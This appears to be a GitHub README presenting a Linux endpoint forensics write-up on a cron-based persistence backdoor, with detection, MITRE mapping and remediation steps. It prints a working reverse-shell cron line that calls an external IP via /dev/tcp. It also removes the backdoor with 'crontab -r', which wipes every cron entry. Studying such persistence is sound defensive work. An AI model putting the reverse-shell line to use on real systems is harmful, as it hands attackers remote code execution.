# Linux-Persistence-Forensics
Linux Endpoint Persistence Auditing & Triage Playbook

## 1. Executive Summary
During a localized endpoint auditing assessment, a critical-severity unauthorized persistence mechanism was identified on a target Linux host. Forensic collection exposed a malicious scheduled task (Cron Job) configured to execute a reverse-shell payload every minute. This background link allows an external adversary to maintain persistent remote code execution (RCE) even after system reboots.

## 2. Forensic Collection & Telemetry Evidence
An audit of the administrative user space task spooler was executed to parse active scheduled daemons:
```bash
crontab -l
```

### 📊 Forensic Artifact Evidence
1. <img width="880" height="70" alt="creating backdoor" src="https://github.com/user-attachments/assets/8422269e-e432-43d0-a833-da4c7e6a3c76" />

2. <img width="919" height="84" alt="catching the backdoor footprint" src="https://github.com/user-attachments/assets/c149efe6-0b80-42ab-b2af-c512c656de31" />

3. <img width="906" height="76" alt="Removing the backdoor payload" src="https://github.com/user-attachments/assets/0f31de36-5f96-40c1-91fa-4114cac014e7" />

The collection phase successfully isolated the following malicious execution vector string:
```text
* * * * * /tmp/malicious_backdoor.sh -c 'bash -i >& /dev/tcp/146.70.147.102/443 0>&1'
```
* **Indicator of Compromise (IoC):** Malicious Remote C2 Server IP: `146.70.147.102`
* **Target Network Port:** Outbound TCP Port `443` (Leveraged to bypass standard outbound firewall filters by mimicking encrypted web traffic).
* **Framework Mapping:** MITRE ATT&CK T1053.003 (Scheduled Task/Job: Cron)

## 3. Remediation & Eradication Playbook
1. **Malicious Element Purge:** Evicted the rogue entry entirely from the active scheduler queue using the administrative tracking reset command: `crontab -r`.
2. **Boundary Hardening:** Configured an egress network firewall rule to drop all outbound packets traveling toward the network block address space `146.70.147.102` to prevent subsequent reconnections.
